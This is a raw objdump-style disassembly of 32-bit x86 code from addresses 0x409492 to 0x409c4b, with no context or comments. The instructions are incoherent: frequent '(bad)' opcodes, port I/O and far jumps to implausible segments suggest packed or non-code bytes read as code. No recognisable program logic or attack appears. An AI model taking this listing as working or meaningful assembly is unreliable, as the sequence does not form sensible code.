  409492:	sti    
  409493:	inc    edx
  409494:	mov    esi,0x46ceee26
  409499:	out    0xbd,al
  40949b:	mov    bh,ch
  40949d:	out    dx,eax
  40949e:	pop    ds
  40949f:	mov    ds:0xb1c54a55,eax
  4094a4:	xchg   BYTE PTR [ebp+0x634996ae],cl
  4094aa:	jmp    0x409511
  4094ac:	sub    BYTE PTR [eax],0xc0
  4094af:	or     ah,BYTE PTR [edi-0xaca2c08]
  4094b5:	pusha  
  4094b6:	fstp   TBYTE PTR [eax-0x2d497684]
  4094bc:	add    eax,0x1f69ee3f
  4094c1:	(bad)  
  4094c2:	iret   
  4094c3:	and    dh,BYTE PTR [esi+0x78a143ce]
  4094c9:	jo     0x409491
  4094cb:	mov    cl,0x94
  4094cd:	arpl   WORD PTR [ebx+0x27d05e96],si
  4094d3:	mov    esi,0x5b4d65f7
  4094d8:	iret   
  4094d9:	pop    ebp
  4094da:	out    0xc4,eax
  4094dc:	fmul   DWORD PTR [esi+0x77]
  4094df:	(bad)  
  4094e0:	out    0xf1,al
  4094e2:	adc    BYTE PTR [edx],0x60
  4094e5:	imul   ebx,DWORD PTR [eax-0x37],0xe1942970
  4094ec:	mov    ah,0x28
  4094ee:	in     eax,dx
  4094ef:	mov    al,ds:0x4e23b84
  4094f4:	popf   
  4094f5:	cmp    eax,0x367c37e4
  4094fa:	fidiv  WORD PTR [eax]
  4094fc:	pop    esi
  4094fd:	fs sbb al,0xc
  409500:	pop    es
  409501:	or     al,0xfa
  409503:	dec    esp
  409504:	aad    0x60
  409506:	fcmovnb st,st(6)
  409508:	cmc    
  409509:	add    al,BYTE PTR [eax+0x8e57f9]
  40950f:	out    0x5,al
  409511:	(bad)  
  409512:	scas   al,BYTE PTR es:[edi]
  409513:	call   0x6149:0x934dc972
  40951a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40951b:	out    dx,al
  40951c:	cmp    al,0xf4
  40951e:	pop    eax
  40951f:	inc    esi
  409520:	push   esi
  409521:	pusha  
  409522:	mov    ?,WORD PTR [edx]
  409524:	sbb    bl,0xee
  409527:	or     DWORD PTR [esi-0x48d56222],ebx
  40952d:	test   eax,0xbf69a125
  409532:	sub    DWORD PTR [edi+0x11cbb7ae],0x12
  409539:	cmp    BYTE PTR [edi],dl
  40953b:	mov    eax,ds:0x21bdb689
  409540:	sub    BYTE PTR [ebx+0x60707d59],dh
  409546:	jmp    0x4094ee
  409548:	mov    dh,0xad
  40954a:	stos   BYTE PTR es:[edi],al
  40954b:	ret    
  40954c:	pop    ebp
  40954d:	adc    al,0xee
  40954f:	push   ebp
  409550:	mov    dl,0xe3
  409552:	ins    DWORD PTR es:[di],dx
  409554:	jnp    0x409559
  409556:	dec    esi
  409557:	(bad)  
  409558:	in     eax,dx
  409559:	mov    dl,0xe2
  40955b:	loopne 0x4095b9
  40955d:	sub    BYTE PTR [esi+0xc],dh
  409560:	daa    
  409561:	pop    edx
  409562:	out    dx,al
  409563:	jbe    0x40955e
  409565:	jne    0x4095b2
  409567:	or     BYTE PTR [esi-0x635edb1c],al
  40956d:	test   eax,0x10e68ad7
  409572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409573:	mov    esp,0xfcfd8c51
  409578:	sahf   
  409579:	loop   0x4095ec
  40957b:	mov    edi,0xa2524c8f
  409580:	sbb    ah,BYTE PTR [edx]
  409582:	aaa    
  409583:	sub    BYTE PTR [ecx+edi*1+0x50264950],cl
  40958a:	out    dx,al
  40958b:	imul   edi,esp,0x52
  40958e:	gs cmp eax,eax
  409591:	data16 adc al,BYTE PTR [edi-0x3c649ee5]
  409598:	xchg   bl,bl
  40959a:	loope  0x409560
  40959c:	imul   edx,DWORD PTR [edx-0x2fc3e61f],0xffffffaa
  4095a3:	push   esi
  4095a4:	pop    esi
  4095a5:	je     0x40957e
  4095a7:	cli    
  4095a8:	pop    edi
  4095a9:	cld    
  4095aa:	daa    
  4095ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ac:	cli    
  4095ad:	adc    BYTE PTR [eax+0x223b7156],bh
  4095b3:	push   ecx
  4095b4:	ret    
  4095b5:	loopne 0x409635
  4095b7:	lahf   
  4095b8:	scas   al,BYTE PTR es:[edi]
  4095b9:	sbb    DWORD PTR [edi-0x60],0x3d
  4095bd:	popa   
  4095be:	(bad)  
  4095bf:	jp     0x409640
  4095c1:	push   eax
  4095c2:	ret    0x18b0
  4095c5:	sub    ch,dh
  4095c7:	lds    ebx,FWORD PTR [ebp+0x4f176cf9]
  4095cd:	hlt    
  4095ce:	popa   
  4095cf:	mov    eax,ds:0xe6db12aa
  4095d4:	aam    0xbd
  4095d6:	clc    
  4095d7:	dec    edi
  4095d8:	xor    cl,BYTE PTR [esi]
  4095da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095db:	and    DWORD PTR [ebx+0x2da71621],esi
  4095e1:	dec    esi
  4095e2:	or     edx,edx
  4095e4:	xchg   ecx,eax
  4095e5:	jmp    0x611af41c
  4095ea:	push   es
  4095eb:	jno    0x40965f
  4095ed:	retf   
  4095ee:	stc    
  4095ef:	js     0x4095ae
  4095f1:	loop   0x4095ca
  4095f3:	sbb    BYTE PTR [esi+0xc],0xe0
  4095f7:	adc    al,0x9b
  4095f9:	pop    ss
  4095fa:	clc    
  4095fb:	cmp    al,0xaf
  4095fd:	pusha  
  4095fe:	adc    eax,edx
  409600:	sti    
  409601:	xor    DWORD PTR [ebx+0x38],0x21
  409605:	push   ds
  409606:	out    dx,al
  409607:	stc    
  409608:	in     eax,0x96
  40960a:	cmp    al,0x65
  40960c:	xchg   edi,eax
  40960d:	adc    bh,BYTE PTR [ebp+0x4f178a0]
  409613:	and    eax,0xd70b42af
  409618:	pop    esi
  409619:	jbe    0x4095f0
  40961b:	popf   
  40961c:	mov    ds:0x9eeab445,al
  409621:	sub    BYTE PTR [edi+esi*8],bh
  409624:	jecxz  0x409686
  409626:	imul   edx,DWORD PTR [ecx+edx*1-0x29b8e009],0xffffffae
  40962e:	out    dx,al
  40962f:	push   esi
  409630:	retf   0x600d
  409633:	mov    esi,0x9f4a51ea
  409638:	(bad)  
  409639:	arpl   di,bx
  40963b:	lds    edi,FWORD PTR [esi-0x14]
  40963e:	or     eax,0xee03a37b
  409643:	jne    0x40961a
  409645:	stos   BYTE PTR es:[edi],al
  409646:	in     eax,dx
  409647:	nop
  409648:	dec    ebx
  409649:	stc    
  40964a:	in     al,0xa1
  40964c:	cs aam 0xce
  40964f:	mov    bh,0x98
  409651:	inc    esi
  409652:	das    
  409653:	icebp  
  409654:	jnp    0x409672
  409656:	in     eax,dx
  409657:	jg     0x4096af
  409659:	(bad)  
  40965a:	sub    bl,BYTE PTR [esi+0x18cecc55]
  409660:	push   eax
  409661:	sub    esi,esi
  409663:	mov    al,ds:0x1ba4a0f6
  409668:	push   0x75
  40966a:	push   edi
  40966b:	or     al,0x53
  40966d:	rcr    BYTE PTR [ebp-0x7b01a1ae],cl
  409673:	cwde   
  409674:	and    BYTE PTR [edx],ah
  409676:	xor    edi,DWORD PTR [edi+0x49]
  409679:	popa   
  40967a:	test   DWORD PTR [esi+0x5d],esp
  40967d:	out    dx,eax
  40967e:	mov    bl,0x3
  409680:	push   es
  409681:	call   0xe1b:0x1341cbee
  409688:	ss or  eax,0x98789412
  40968e:	repnz sub ah,BYTE PTR [ebx+0x33]
  409692:	mov    ah,0xc0
  409694:	cmp    ebp,edi
  409696:	in     al,0xf4
  409698:	add    ah,BYTE PTR [ecx-0x48]
  40969b:	and    eax,DWORD PTR [esi-0x39539fe6]
  4096a1:	xor    eax,0x105495ee
  4096a6:	icebp  
  4096a7:	test   BYTE PTR [eax],bl
  4096a9:	push   cs
  4096aa:	mul    BYTE PTR [eax-0x530de86f]
  4096b0:	jmp    0x4096ac
  4096b2:	mov    ds:0xd1495ee0,al
  4096b7:	pop    ss
  4096b8:	cmp    edx,DWORD PTR [eax+0x5298bed9]
  4096be:	mov    bl,0xa6
  4096c0:	data16 jnp 0x4096ba
  4096c3:	mov    al,ds:0xbc5bfc69
  4096c8:	imul   edx,DWORD PTR [eax+0x1],0xaea2ff3c
  4096cf:	xchg   esp,eax
  4096d0:	sbb    dh,0x7e
  4096d3:	test   eax,0xdcb860c8
  4096d8:	lahf   
  4096d9:	fadd   DWORD PTR ds:0xf3cb58fe
  4096df:	xor    dh,bl
  4096e1:	cdq    
  4096e2:	add    esp,DWORD PTR [ecx+0x3e835a55]
  4096e8:	in     eax,0x60
  4096ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096eb:	dec    edx
  4096ec:	adc    esi,esp
  4096ee:	mov    bl,0x41
  4096f0:	pop    ebp
  4096f1:	lods   al,BYTE PTR ds:[esi]
  4096f2:	out    dx,al
  4096f3:	push   ebx
  4096f4:	and    al,BYTE PTR [edi]
  4096f6:	mov    ah,BYTE PTR [ebx-0x5618cec6]
  4096fc:	lods   eax,DWORD PTR ds:[esi]
  4096fd:	ret    0xc1a1
  409700:	pop    esi
  409701:	out    dx,eax
  409702:	xlat   BYTE PTR ds:[ebx]
  409703:	pop    edx
  409704:	push   eax
  409705:	repnz and edi,DWORD PTR [esi-0xad78ea1]
  40970c:	sti    
  40970d:	cdq    
  40970e:	std    
  40970f:	mov    al,ds:0x97e3ec6e
  409714:	enter  0x423b,0x37
  409718:	pop    esi
  409719:	and    DWORD PTR [ebx-0x41],ecx
  40971c:	fsubr  QWORD PTR [edx+0x4c]
  40971f:	idiv   DWORD PTR [eax+eiz*2+0x29]
  409723:	pop    es
  409724:	sbb    eax,0x9e754311
  409729:	ret    0x4401
  40972c:	xchg   esp,eax
  40972d:	sbb    eax,0xee72376e
  409732:	or     BYTE PTR ds:0xc9042e4b,al
  409738:	push   0x82f802b2
  40973d:	(bad)  [esi-0x6abee2d1]
  409743:	div    BYTE PTR [ecx]
  409745:	mov    ah,0xee
  409747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409748:	mov    gs,WORD PTR [eax]
  40974a:	add    al,0x69
  40974c:	mov    edi,0xeeaed171
  409751:	in     eax,dx
  409752:	outs   dx,BYTE PTR ds:[esi]
  409753:	nop
  409754:	jp     0x4097a0
  409756:	mov    bh,0x63
  409758:	gs and eax,0x148d11ee
  40975e:	loopne 0x4096f7
  409760:	ds xor eax,0x9ebfc05b
  409766:	loop   0x4097b3
  409768:	push   eax
  409769:	add    al,0xef
  40976b:	mov    edx,0x4a262152
  409770:	in     eax,0x7
  409772:	loope  0x409714
  409774:	je     0x409735
  409776:	popa   
  409777:	mov    bl,0x46
  409779:	push   cs
  40977a:	das    
  40977b:	add    bl,BYTE PTR [esi-0x3e]
  40977e:	mov    ah,0xb0
  409780:	lods   eax,DWORD PTR ds:[esi]
  409781:	pop    esp
  409782:	pop    ecx
  409783:	mov    ebx,0x20936135
  409788:	jmp    0x99ac:0xde3fd792
  40978f:	dec    ecx
  409790:	xor    al,0x5a
  409792:	fs jae 0x40980f
  409795:	jb     0x4097a8
  409797:	hlt    
  409798:	bound  edx,QWORD PTR [eax]
  40979a:	dec    esi
  40979b:	mov    esi,DWORD PTR [edx]
  40979d:	outs   dx,DWORD PTR ds:[esi]
  40979e:	and    dl,BYTE PTR [esi-0x5ecb1749]
  4097a4:	xchg   ecx,eax
  4097a5:	(bad)  
  4097a6:	(bad)  
  4097a8:	push   esi
  4097a9:	push   es
  4097aa:	jge    0x40974d
  4097ac:	mov    ah,0x63
  4097ae:	aaa    
  4097af:	add    DWORD PTR [ebx],edi
  4097b1:	pop    esp
  4097b2:	lds    esp,FWORD PTR [edx]
  4097b4:	pop    esi
  4097b5:	scas   eax,DWORD PTR es:[edi]
  4097b6:	cli    
  4097b7:	adc    al,0xa7
  4097b9:	(bad)  
  4097ba:	jmp    0x4097c7
  4097bc:	pop    ss
  4097bd:	dec    edx
  4097be:	xor    al,0xe6
  4097c0:	mov    esp,DWORD PTR [eax-0x18]
  4097c3:	shr    dh,cl
  4097c5:	div    bh
  4097c7:	aam    0x5f
  4097c9:	cmp    al,0xab
  4097cb:	and    al,0xf7
  4097cd:	inc    esp
  4097ce:	aas    
  4097cf:	sbb    DWORD PTR [ebx+0xc],0x19da178
  4097d6:	addr16 jno 0x4097a0
  4097d9:	sub    bl,bh
  4097db:	call   0xecbd:0x8f0b85e
  4097e2:	out    dx,eax
  4097e3:	xchg   ebp,eax
  4097e4:	ret    0x9f60
  4097e7:	mov    bl,0xce
  4097e9:	addr16 (bad) 
  4097eb:	sbb    BYTE PTR [ecx],bh
  4097ed:	dec    eax
  4097ee:	out    dx,al
  4097ef:	inc    eax
  4097f0:	mov    WORD PTR [ebx+eax*8],?
  4097f3:	outs   dx,BYTE PTR ds:[esi]
  4097f4:	push   ecx
  4097f5:	jecxz  0x40986b
  4097f7:	and    eax,0xa25b1160
  4097fd:	mov    ebp,0xe514c5a6
  409802:	out    dx,al
  409803:	jge    0x409873
  409805:	push   0x5a2ece82
  40980a:	inc    esp
  40980b:	test   al,0x59
  40980d:	je     0x409851
  40980f:	sub    ah,BYTE PTR [ebx]
  409811:	and    DWORD PTR [edx],esp
  409813:	jne    0x409844
  409815:	xor    esi,ebp
  409817:	arpl   di,dx
  409819:	jmp    0x4097e5
  40981b:	mov    cl,BYTE PTR [esi-0x705ecc9f]
  409821:	outs   dx,BYTE PTR ds:[esi]
  409822:	loop   0x40988a
  409824:	add    bl,BYTE PTR [eax-0x4d]
  409827:	aad    0x52
  409829:	loop   0x40982b
  40982b:	pop    es
  40982c:	pop    esi
  40982d:	mov    esp,0xa9cbcd21
  409832:	popa   
  409833:	mov    eax,ds:0xa068170d
  409838:	push   ss
  409839:	mov    bl,0xa8
  40983b:	in     al,0x63
  40983d:	setg   BYTE PTR ds:[eax-0x68f2929e]
  409845:	and    ecx,ecx
  409847:	imul   edi,DWORD PTR [edx+0x39],0x75
  40984b:	imul   eax,ebx,0x14dc660
  409851:	(bad)  
  409852:	or     eax,0xee3ef530
  409857:	mov    ds:0x5a2a9bf4,al
  40985c:	push   edx
  40985d:	in     al,0x39
  40985f:	mov    ?,WORD PTR [edi-0x1ede6b55]
  409865:	mov    esi,0x619841ed
  40986a:	lock mul BYTE PTR [ebx+ebx*8+0x192c14f]
  409872:	aas    
  409873:	outs   dx,BYTE PTR ds:[esi]
  409874:	inc    edi
  409875:	inc    edx
  409876:	mov    al,cl
  409878:	xchg   esi,eax
  409879:	pusha  
  40987a:	cdq    
  40987b:	or     edx,DWORD PTR [ecx]
  40987d:	int    0xa1
  40987f:	and    bl,BYTE PTR [esi-0x62]
  409882:	imul   esp,DWORD PTR [ebp-0x60],0x23
  409886:	xor    DWORD PTR [ecx+0x44f46095],esi
  40988c:	jge    0x40985b
  40988e:	cmp    cl,BYTE PTR [eax-0x66009a91]
  409894:	mov    al,0xe5
  409896:	fbld   TBYTE PTR [eax]
  409898:	lahf   
  409899:	test   al,0x72
  40989b:	cmp    al,0x62
  40989d:	mov    ah,0xfe
  40989f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a0:	mov    esp,0x7b5f0f20
  4098a5:	rcl    al,0x49
  4098a8:	xor    al,0x4e
  4098aa:	dec    esi
  4098ab:	in     eax,dx
  4098ac:	pop    esi
  4098ad:	int    0xb6
  4098af:	shl    DWORD PTR [edi],0xd7
  4098b2:	mov    bh,0x40
  4098b4:	and    BYTE PTR [ebp-0x45],al
  4098b7:	mov    cl,0xee
  4098b9:	leave  
  4098ba:	sub    BYTE PTR [eax+0x4119216c],0x17
  4098c1:	fsub   QWORD PTR [eax]
  4098c3:	mov    ah,0xd3
  4098c5:	mov    al,ds:0x60a50b9e
  4098ca:	cmc    
  4098cb:	push   ds
  4098cc:	lock add ebx,edi
  4098cf:	mov    edx,0x97eedb61
  4098d4:	jg     0x409931
  4098d6:	xlat   BYTE PTR ds:[ebx]
  4098d7:	add    edi,edx
  4098d9:	mov    esp,0x3486a123
  4098de:	sbb    BYTE PTR [ecx-0x2e31d6fa],bh
  4098e4:	pop    esi
  4098e5:	push   es
  4098e6:	xchg   ebp,eax
  4098e7:	mov    cl,BYTE PTR [edx]
  4098e9:	jg     0x409940
  4098eb:	daa    
  4098ec:	stc    
  4098ed:	and    DWORD PTR ds:0x479aada1,esi
  4098f3:	and    bl,dl
  4098f5:	pop    ecx
  4098f6:	and    ch,BYTE PTR ds:0xa41fa05e
  4098fc:	push   esi
  4098fd:	test   DWORD PTR [ebx-0x1f],0x43715d80
  409904:	ds xchg esp,eax
  409906:	mov    cl,0xbf
  409908:	scas   al,BYTE PTR es:[edi]
  409909:	in     eax,0xed
  40990b:	xchg   ecx,eax
  40990c:	pop    esi
  40990d:	and    al,0x84
  40990f:	xor    ecx,ebp
  409911:	xchg   esp,eax
  409912:	adc    al,0xaf
  409914:	lahf   
  409915:	push   edx
  409916:	sbb    BYTE PTR [ebx],al
  409918:	or     BYTE PTR [esi],bh
  40991a:	inc    edi
  40991b:	cmp    esp,DWORD PTR [ebx+0x31f140a0]
  409921:	dec    edi
  409922:	out    dx,al
  409923:	out    0xb0,eax
  409925:	aaa    
  409926:	test   DWORD PTR [ebx],ecx
  409928:	outs   dx,DWORD PTR ds:[esi]
  409929:	(bad)  
  40992a:	shl    DWORD PTR [eax+0x1f794203],1
  409930:	lds    esi,FWORD PTR [esi+0x22]
  409933:	lock pop esi
  409935:	jg     0x40995d
  409937:	inc    ebp
  409938:	(bad)  
  409939:	jno    0x40992f
  40993b:	cmc    
  40993c:	bound  esp,QWORD PTR [ecx-0x58]
  40993f:	push   0xffffffdc
  409941:	imul   edi,DWORD PTR [edi+edi*1],0x67eebade
  409948:	ror    BYTE PTR [eax+0x1],cl
  40994b:	or     DWORD PTR [ebp-0x55],0x9e84a161
  409952:	add    eax,0xc62e70e
  409957:	and    dl,BYTE PTR [ecx-0x7e]
  40995a:	inc    esi
  40995b:	cwde   
  40995c:	pop    esi
  40995d:	fist   WORD PTR [eax]
  40995f:	ins    DWORD PTR es:[edi],dx
  409960:	dec    esi
  409961:	sub    edx,DWORD PTR [ebp+0x63141a8]
  409967:	test   eax,0x3e7051f6
  40996c:	jle    0x4098ee
  40996e:	mov    eax,ds:0xee47d6ed
  409973:	mov    cs,WORD PTR [ebp-0x6d85e8cc]
  409979:	ja     0x409968
  40997b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40997c:	retf   
  40997d:	imul   edi,esp,0x1d
  409980:	out    dx,al
  409981:	xor    ah,dl
  409983:	mov    dh,0x68
  409985:	push   es
  409986:	in     eax,dx
  409987:	mov    esp,0x77cb5e8a
  40998c:	push   edi
  40998d:	inc    esp
  40998e:	inc    eax
  40998f:	popa   
  409990:	mov    al,ds:0x9ca0ba67
  409995:	int3   
  409996:	outs   dx,BYTE PTR ds:[esi]
  409997:	push   DWORD PTR [edx]
  409999:	push   esi
  40999a:	in     eax,0xc
  40999c:	pop    esi
  40999d:	adc    BYTE PTR [edi],cl
  40999f:	xor    BYTE PTR [edi+ecx*4],dl
  4099a2:	ins    DWORD PTR es:[edi],dx
  4099a3:	xor    eax,0xd7dd6151
  4099a8:	mov    eax,0xa07c04a8
  4099ad:	shr    esi,0xf9
  4099b0:	and    eax,0x4f9fa0a6
  4099b5:	jae    0x409a06
  4099b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b8:	add    ebp,ebp
  4099ba:	jmp    0xef047811
  4099bf:	cli    
  4099c0:	in     al,0xaa
  4099c2:	xchg   ebx,eax
  4099c3:	out    dx,eax
  4099c4:	jle    0x409a14
  4099c6:	jae    0x409970
  4099c8:	enter  0xf0d1,0x8e
  4099cc:	mov    ch,0xe0
  4099ce:	or     edx,DWORD PTR [ebp-0x6c]
  4099d1:	push   esp
  4099d2:	out    dx,al
  4099d3:	push   0x9e249536
  4099d8:	cs cdq 
  4099da:	pop    edx
  4099db:	scas   eax,DWORD PTR es:[edi]
  4099dc:	mov    ah,0x10
  4099de:	and    al,0xcb
  4099e0:	fidivr WORD PTR [esi-0x14]
  4099e3:	xchg   DWORD PTR [edx+0x56],eax
  4099e6:	sub    eax,0xb13e5eb4
  4099eb:	dec    ecx
  4099ec:	bswap  edi
  4099ee:	inc    edx
  4099ef:	test   BYTE PTR [eax],ah
  4099f1:	jmp    0x937d389e
  4099f6:	xor    edx,eax
  4099f8:	(bad)  
  4099f9:	adc    eax,0x6b7662c1
  4099fe:	out    dx,al
  4099ff:	sub    DWORD PTR [ecx+0x7e87fa77],eax
  409a05:	aaa    
  409a06:	pop    edi
  409a07:	lahf   
  409a08:	(bad)  
  409a0a:	pop    esi
  409a0b:	dec    ebp
  409a0c:	arpl   WORD PTR ds:[eax-0x66],bx
  409a10:	mov    ebx,0x53a8da70
  409a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a16:	pop    ebx
  409a17:	jae    0x409a77
  409a19:	in     al,dx
  409a1a:	sti    
  409a1b:	inc    esp
  409a1c:	in     al,0xd
  409a1e:	push   ebp
  409a1f:	fst    DWORD PTR [edi+0x195eeeb]
  409a25:	rcl    BYTE PTR [eax],1
  409a27:	xor    eax,0xcf31572
  409a2c:	cld    
  409a2d:	std    
  409a2e:	out    0x57,al
  409a30:	pop    esi
  409a31:	hlt    
  409a32:	inc    eax
  409a33:	jg     0x409a19
  409a35:	pop    eax
  409a36:	pop    esi
  409a37:	outs   dx,DWORD PTR ds:[esi]
  409a38:	idiv   BYTE PTR [ebx-0xc5b1e12]
  409a3e:	fwait
  409a3f:	jno    0x409a31
  409a41:	mov    ah,al
  409a43:	mov    al,ds:0xf177d10c
  409a48:	test   bh,bl
  409a4a:	jl     0x4099ec
  409a4c:	out    dx,al
  409a4d:	scas   al,BYTE PTR es:[edi]
  409a4e:	clc    
  409a4f:	cdq    
  409a50:	xchg   esp,eax
  409a51:	dec    edx
  409a52:	arpl   WORD PTR [eax-0x5eb53fbc],bp
  409a58:	fcom   QWORD PTR [ecx+0x51641af4]
  409a5e:	or     DWORD PTR [edx+0x30d300da],ebp
  409a64:	push   cs
  409a65:	in     al,dx
  409a66:	mul    BYTE PTR [ebx-0x7c9c43e2]
  409a6c:	jge    0x409ad4
  409a6e:	xchg   BYTE PTR [edx-0x8],dl
  409a71:	sbb    ch,dh
  409a73:	jb     0x409aaa
  409a75:	ins    BYTE PTR es:[edi],dx
  409a76:	ss jge 0x409a38
  409a79:	mov    al,dh
  409a7b:	ins    BYTE PTR es:[edi],dx
  409a7c:	push   esi
  409a7d:	popa   
  409a7e:	pop    ds
  409a7f:	pop    es
  409a80:	xor    BYTE PTR ds:0x9f2c819c,cl
  409a86:	out    dx,al
  409a87:	popa   
  409a88:	jnp    0x409b05
  409a8a:	fcmovne st,st(3)
  409a8c:	push   0x5b
  409a8e:	inc    ebx
  409a8f:	jne    0x409b05
  409a91:	pusha  
  409a92:	xchg   esp,eax
  409a93:	or     BYTE PTR [ecx-0x68],0x63
  409a97:	ins    DWORD PTR es:[edi],dx
  409a98:	and    BYTE PTR [esi-0x74b817ef],cl
  409a9e:	fsub   QWORD PTR [edi-0x5f4f8fa9]
  409aa4:	mov    dh,BYTE PTR [eax]
  409aa6:	js     0x409b14
  409aa8:	popf   
  409aa9:	mov    dl,0x74
  409aab:	xor    BYTE PTR [ecx],bl
  409aad:	ret    
  409aae:	pop    ebp
  409aaf:	dec    ebp
  409ab0:	outs   dx,BYTE PTR ds:[esi]
  409ab1:	fimul  WORD PTR [esi]
  409ab3:	mov    eax,ds:0x5b6a4d29
  409ab8:	repz or DWORD PTR [ebx-0x3692aec8],edi
  409abf:	add    ebx,DWORD PTR [esi]
  409ac1:	xchg   ecx,eax
  409ac2:	mov    DWORD PTR [ebx-0x5a2a6b57],esi
  409ac8:	fistp  WORD PTR [esp+ecx*4]
  409acb:	xor    DWORD PTR [ebp-0x2ea564a7],edi
  409ad1:	xor    BYTE PTR [esi],bl
  409ad3:	push   esp
  409ad4:	(bad)  
  409ad5:	in     al,0xed
  409ad7:	push   0x3b
  409ad9:	xchg   DWORD PTR [ebx+esi*1-0x5f19e1f],eax
  409ae0:	cmp    eax,0x65107c52
  409ae5:	mov    ds:0xa969209f,eax
  409aea:	mov    ?,WORD PTR [edx]
  409aec:	cdq    
  409aed:	sbb    edx,DWORD PTR [eax+0x47]
  409af0:	pop    edi
  409af1:	push   cs
  409af2:	mov    dh,0xaa
  409af4:	dec    DWORD PTR [ebp+0x1130619e]
  409afa:	xchg   edi,eax
  409afb:	mov    eax,ds:0x501a5dc3
  409b00:	jge    0x409b7e
  409b02:	jp     0x409ae1
  409b04:	pop    esi
  409b05:	stc    
  409b06:	fisttp WORD PTR [edx]
  409b08:	pop    ds
  409b09:	push   0xffffffa9
  409b0b:	(bad)  
  409b0c:	outs   dx,DWORD PTR ds:[esi]
  409b0d:	pop    ecx
  409b0e:	mov    ch,0x30
  409b10:	cmp    BYTE PTR [edx-0x49fdef2f],dh
  409b16:	mov    eax,0x4985ee4
  409b1b:	xchg   edx,eax
  409b1c:	adc    al,dl
  409b1e:	jae    0x409b37
  409b20:	rcl    BYTE PTR [edx+0x6f],cl
  409b23:	dec    esp
  409b24:	test   DWORD PTR [ecx],eax
  409b26:	dec    esi
  409b27:	call   0x526baeff
  409b2c:	push   edx
  409b2d:	inc    esp
  409b2e:	inc    esp
  409b2f:	pushw  ds
  409b31:	into   
  409b32:	test   ecx,eax
  409b34:	xor    ch,BYTE PTR [ebx]
  409b36:	pop    ss
  409b37:	test   al,0x7f
  409b39:	in     eax,dx
  409b3a:	adc    BYTE PTR [edx],ch
  409b3c:	test   eax,0xfc59b13f
  409b41:	xor    bh,al
  409b43:	inc    ebp
  409b44:	repnz (bad) 
  409b46:	out    dx,al
  409b47:	outs   dx,BYTE PTR ds:[esi]
  409b48:	mov    esi,0xb19e67bc
  409b4d:	mov    bh,0x91
  409b4f:	mov    eax,ds:0x6fccb8e8
  409b54:	and    bh,dh
  409b56:	xchg   edi,eax
  409b57:	sub    eax,0x433d165e
  409b5c:	idiv   DWORD PTR [edx]
  409b5e:	(bad)  
  409b5f:	loop   0x409aea
  409b61:	pusha  
  409b62:	jns    0x409aec
  409b64:	xor    ecx,edi
  409b66:	popf   
  409b67:	fidivr WORD PTR [edi+0xc]
  409b6a:	out    dx,al
  409b6b:	aaa    
  409b6c:	std    
  409b6d:	or     ch,ch
  409b6f:	stc    
  409b70:	scas   al,BYTE PTR es:[edi]
  409b71:	(bad)  
  409b72:	lea    esp,[eax+0x32f24646]
  409b78:	ds cwde 
  409b7a:	std    
  409b7b:	push   0xedeefc3a
  409b80:	inc    edx
  409b81:	pop    ebp
  409b82:	jb     0x409b70
  409b84:	jnp    0x409b22
  409b86:	fsub   DWORD PTR [eax+0x526a9318]
  409b8c:	inc    eax
  409b8d:	shl    BYTE PTR [ebp-0x64],1
  409b90:	pop    ebp
  409b91:	outs   dx,BYTE PTR ds:[esi]
  409b92:	sub    bl,ah
  409b94:	loopne 0x409be3
  409b96:	lock xor BYTE PTR [esi],bh
  409b99:	pushf  
  409b9a:	retf   0x81a4
  409b9d:	inc    eax
  409b9e:	pop    ebx
  409b9f:	cwde   
  409ba0:	imul   ebx,DWORD PTR [esi-0x1f61776e],0x77
  409ba7:	sub    BYTE PTR [esi+edi*4-0x11],0x29
  409bac:	inc    edi
  409bad:	inc    esi
  409bae:	and    cl,BYTE PTR [edi-0x43068722]
  409bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb5:	mov    edx,0x7df8afbc
  409bba:	outs   dx,BYTE PTR ds:[esi]
  409bbb:	jle    0x409c2c
  409bbd:	add    eax,0x5e0bb5e8
  409bc2:	out    dx,al
  409bc3:	or     eax,0x20702f0c
  409bc8:	mov    edx,0x68a157ed
  409bcd:	xchg   ecx,eax
  409bce:	or     BYTE PTR [eax-0x1300e965],cl
  409bd4:	pop    esi
  409bd5:	sar    BYTE PTR [edi+0x62],0xe4
  409bd9:	or     BYTE PTR [ebp+0x3359cc6c],cl
  409bdf:	call   0x88fd:0x61165976
  409be6:	xchg   esi,eax
  409be7:	daa    
  409be8:	pop    esi
  409be9:	sub    cl,BYTE PTR [ecx]
  409beb:	loop   0x409c47
  409bed:	mov    ebp,0x52d20ca2
  409bf2:	xchg   ecx,eax
  409bf3:	dec    edi
  409bf4:	imul   edx,DWORD PTR [ecx+0x6e],0x2e
  409bf8:	push   ebp
  409bf9:	cmp    bl,BYTE PTR [edx]
  409bfb:	sub    esp,DWORD PTR [ebp+0x28]
  409bfe:	sbb    al,0xeb
  409c00:	mul    al
  409c02:	adc    DWORD PTR gs:[eax+0x5d9a5297],ebx
  409c09:	dec    ebx
  409c0a:	xlat   BYTE PTR ds:[ebx]
  409c0b:	sbb    bl,dh
  409c0d:	xor    al,0x1e
  409c0f:	adc    eax,0xb47e2d12
  409c14:	pop    edi
  409c15:	inc    esp
  409c16:	and    eax,0xa7d1a21f
  409c1b:	sbb    BYTE PTR [ecx+0x48],dh
  409c1e:	aam    0xa0
  409c20:	inc    esi
  409c21:	jmp    0x409c1f
  409c23:	or     BYTE PTR ds:0x3ab462f6,bl
  409c29:	mov    bh,0x44
  409c2b:	xor    eax,0x41fbbd63
  409c30:	scas   eax,DWORD PTR es:[edi]
  409c31:	popf   
  409c32:	fs cmp dh,0x56
  409c36:	or     DWORD PTR [ecx-0x5c69521b],esp
  409c3c:	imul   ecx,DWORD PTR [esi],0xffffffe3
  409c3f:	push   edx
  409c40:	push   edx
  409c41:	(bad)  [ecx]
  409c43:	or     BYTE PTR [esi-0x7e],bl
  409c46:	push   DWORD PTR [edx+0x30]
  409c49:	aas    
  409c4a:	dec    edi
  409c4b:	mov    ds:0xa07420bd,eax
